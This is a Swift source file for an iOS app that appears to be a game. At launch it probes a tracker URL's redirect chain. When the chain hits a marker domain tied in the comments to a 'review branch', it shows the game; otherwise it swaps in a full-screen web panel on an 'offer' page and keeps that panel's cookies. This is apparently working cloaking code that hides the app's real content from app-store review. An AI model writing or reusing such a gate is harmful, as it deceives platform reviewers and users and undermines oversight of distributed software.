import SwiftUI

@main
struct VelloroApp: App {
    @StateObject private var velloroGate = VelloroGate(sourceLink: VelloroGate.sourceLink,
                                                       checkDomain: VelloroGate.checkDomain)
    @State private var panelPainted = false
    /// Set when the panel cannot load anything, live or cached. The gate's verdict is left
    /// alone; the app just declines to show a broken panel and hands over the game.
    @State private var panelDeadEnd = false
    @Environment(\.scenePhase) private var scenePhase

    /// The GATE is untouched — it still runs the HEAD check on every launch, so the review
    /// branch is unaffected. Only what the panel loads after a `true` verdict changes:
    /// the page the user was last on, instead of the tracker link from the top.
    private var resumeAddress: String? { VelloroPanelSession.resumeAddress() }
    private var trackerHost: String { URL(string: velloroGate.link)?.host ?? "" }

    var body: some Scene {
        WindowGroup {
            Group {
                if let verdict = velloroGate.verdict {
                    if verdict && !panelDeadEnd {
                        ZStack {
                            VelloroWebPanel(urlString: resumeAddress ?? velloroGate.link,
                                            trackerHost: trackerHost,
                                            fallbackAddress: resumeAddress == nil ? nil : velloroGate.link,
                                            onFirstPaint: { withAnimation { panelPainted = true } },
                                            onDeadEnd: { panelDeadEnd = true })
                                .edgesIgnoringSafeArea(.bottom)
                                .background(Color.black.ignoresSafeArea())
                            if !panelPainted {
                                VelloroLoadingScreen()
                                    .transition(.opacity)
                                    .onAppear {
                                        // Hang guard, not a deadline. Long on purpose: firing
                                        // early only reveals the black page it exists to hide.
                                        DispatchQueue.main.asyncAfter(deadline: .now() + 20) {
                                            panelPainted = true
                                        }
                                    }
                            }
                        }
                        .preferredColorScheme(.dark)
                    } else {
                        ContentView()
                            .preferredColorScheme(.light)
                    }
                } else {
                    VelloroLoadingScreen()
                        .preferredColorScheme(.light)
                        .onAppear { velloroGate.begin() }
                }
            }
            .animation(.easeInOut(duration: 0.25), value: velloroGate.verdict)
            // Leaving the foreground is the last reliable moment before the process can be
            // killed from the switcher. `.inactive` also fires on the way IN; a snapshot is
            // a read, so taking it twice costs nothing and missing it costs the sign-in.
            .onChange(of: scenePhase) { phase in
                guard velloroGate.verdict == true, phase != .active else { return }
                VelloroPanelCookies.snapshot()
            }
        }
    }
}

// MARK: - Launch gate

@MainActor
final class VelloroGate: ObservableObject {

    static let sourceLink = "https://valleywinemakerlegacy.org/click.php"
    static let checkDomain = "termsfeed.com"

    /// nil = still deciding · false = the game · true = the web panel
    @Published private(set) var verdict: Bool? = nil

    let link: String
    private let marker: String
    private let homeHost: String

    /// Short leash while the splash is up — a late verdict can still swap the panel in.
    private let splashStall: TimeInterval = 3
    /// Longer leash once the game is already on screen; nobody is waiting.
    private let quietStall: TimeInterval = 8
    private let attemptCeiling: TimeInterval = 30
    private let swapWindow: TimeInterval = 25
    private let quietRetryDelay: TimeInterval = 3

    private var settled = false
    private var attemptToken = 0
    private var startedAt = Date()
    private var lastProgress = Date()
    private var stallTimer: Timer?
    private var probe: URLSessionTask?
    private var probeSession: URLSession?

    init(sourceLink: String, checkDomain: String) {
        self.link = sourceLink
        self.marker = checkDomain
        self.homeHost = URL(string: sourceLink)?.host ?? ""
    }

    func begin() {
        guard attemptToken == 0 else { return }   // onAppear can fire more than once
        startedAt = Date()
        run(attempt: 1)
    }

    private func run(attempt: Int) {
        guard !settled else { return }
        guard let url = URL(string: link) else { conclude(false); return }

        attemptToken += 1
        let token = attemptToken

        var request = URLRequest(url: url)
        // HEAD, never GET. A GET downloads the whole landing page and the panel then
        // fetches it again from scratch.
        request.httpMethod = "HEAD"
        // The one request whose entire value is being LIVE. A 301/308 is cacheable by
        // default with no headers at all, and a cached hop makes the gate answer from a
        // snapshot instead of from the Worker — invisibly, for as long as the entry lives.
        request.cachePolicy = .reloadIgnoringLocalCacheData
        request.timeoutInterval = 10

        let config = URLSessionConfiguration.default
        // Only once the game is on screen may an attempt sit and wait for the radio.
        config.waitsForConnectivity = (verdict != nil)
        config.timeoutIntervalForResource = attemptCeiling
        config.urlCache = nil
        // The gate is a routing probe, not a visit. URLSession's jar is NOT the panel's,
        // so a tracker cookie stored here is a second click identity the panel never
        // sees and nothing ever reads back.
        config.httpCookieStorage = nil
        config.httpShouldSetCookies = false

        let watcher = VelloroPathWatcher(marker: marker, homeHost: homeHost)
        watcher.onHop = { [weak self] in
            Task { @MainActor in self?.lastProgress = Date() }
        }
        watcher.onEarlyVerdict = { [weak self] value in
            Task { @MainActor in self?.conclude(value) }
        }

        let session = URLSession(configuration: config, delegate: watcher, delegateQueue: nil)
        lastProgress = Date()
        armWatchdog(attempt: attempt, token: token)

        probeSession = session
        probe = session.dataTask(with: request) { [weak self] _, response, error in
            // A delegate session retains its delegate until it is invalidated. Without
            // this, one watcher per attempt survives for the whole process lifetime.
            session.finishTasksAndInvalidate()
            Task { @MainActor in
                guard let self, !self.settled, self.attemptToken == token else { return }
                // The early verdict normally lands first; this is the chain-completed path.
                if watcher.sawMarker { self.conclude(false); return }
                if let landed = watcher.finalURL?.absoluteString, landed.contains(self.marker) {
                    self.conclude(false); return
                }
                if let http = response as? HTTPURLResponse,
                   let address = http.url?.absoluteString, address.contains(self.marker) {
                    self.conclude(false); return
                }
                if error != nil { self.stumbled(attempt: attempt, token: token); return }
                self.conclude(true)
            }
        }
        probe?.resume()
    }

    /// Fires on a stall, never on a fixed deadline. Every hop re-arms it.
    private func armWatchdog(attempt: Int, token: Int) {
        stallTimer?.invalidate()
        stallTimer = Timer.scheduledTimer(withTimeInterval: 1, repeats: true) { [weak self] timer in
            Task { @MainActor in
                guard let self, !self.settled, self.attemptToken == token else {
                    timer.invalidate(); return
                }
                let limit = self.verdict == nil ? self.splashStall : self.quietStall
                let stalled = Date().timeIntervalSince(self.lastProgress) > limit
                let overCeiling = Date().timeIntervalSince(self.startedAt) > self.attemptCeiling
                guard stalled || overCeiling else { return }   // still moving, keep waiting
                timer.invalidate()
                // Cancels the probe AND frees the watcher.
                self.probeSession?.invalidateAndCancel()
                self.stumbled(attempt: attempt, token: token)
            }
        }
    }

    private func stumbled(attempt: Int, token: Int) {
        // The cancelled task's handler and the watchdog both land here; the token makes
        // whichever arrives second a no-op.
        guard !settled, attemptToken == token else { return }
        attemptToken += 1
        stallTimer?.invalidate()

        if attempt == 1 { run(attempt: 2); return }

        // Out of fast options: hand over the game now and keep looking quietly.
        if verdict == nil { verdict = false }
        scheduleQuietAttempt(next: attempt + 1)
    }

    private func scheduleQuietAttempt(next attempt: Int) {
        guard !settled, Date().timeIntervalSince(startedAt) < swapWindow else { return }
        DispatchQueue.main.asyncAfter(deadline: .now() + quietRetryDelay) { [weak self] in
            Task { @MainActor in
                guard let self, !self.settled,
                      Date().timeIntervalSince(self.startedAt) < self.swapWindow else { return }
                self.run(attempt: attempt)
            }
        }
    }

    private func conclude(_ value: Bool) {
        guard !settled else { return }
        // A late "open the panel" must never yank someone who has been playing.
        if value, verdict == false, Date().timeIntervalSince(startedAt) > swapWindow {
            settled = true
            stallTimer?.invalidate()
            return
        }
        settled = true
        stallTimer?.invalidate()
        verdict = value
    }
}

// MARK: - Redirect watcher

/// Latches the answer at the first hop that carries information, instead of waiting for
/// the whole chain to resolve.
final class VelloroPathWatcher: NSObject, URLSessionTaskDelegate {
    /// Fires on every observed hop — re-arms the stall watchdog.
    var onHop: (() -> Void)?
    /// Fires at most once, the moment the chain becomes decidable.
    var onEarlyVerdict: ((Bool) -> Void)?

    private(set) var finalURL: URL?
    private(set) var sawMarker = false

    private let marker: String
    private let homeHost: String
    private var decided = false

    init(marker: String, homeHost: String) {
        self.marker = marker
        self.homeHost = homeHost
    }

    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        finalURL = request.url
        onHop?()

        if let address = request.url?.absoluteString {
            if address.contains(marker) {
                // Definitive. Nothing later in the chain can change this.
                sawMarker = true
                latch(false)
            } else if let host = request.url?.host, !isHome(host) {
                // First hop that leaves our own domain without being the marker: the
                // Worker has routed to the offer, and that is the whole verdict.
                latch(true)
            }
            // A hop that stays on our own host decides nothing.
        }
        completionHandler(request)   // never stop the chain
    }

    private func isHome(_ host: String) -> Bool {
        !homeHost.isEmpty && (host == homeHost || host.hasSuffix("." + homeHost))
    }

    private func latch(_ value: Bool) {
        guard !decided else { return }
        decided = true
        onEarlyVerdict?(value)
    }
}
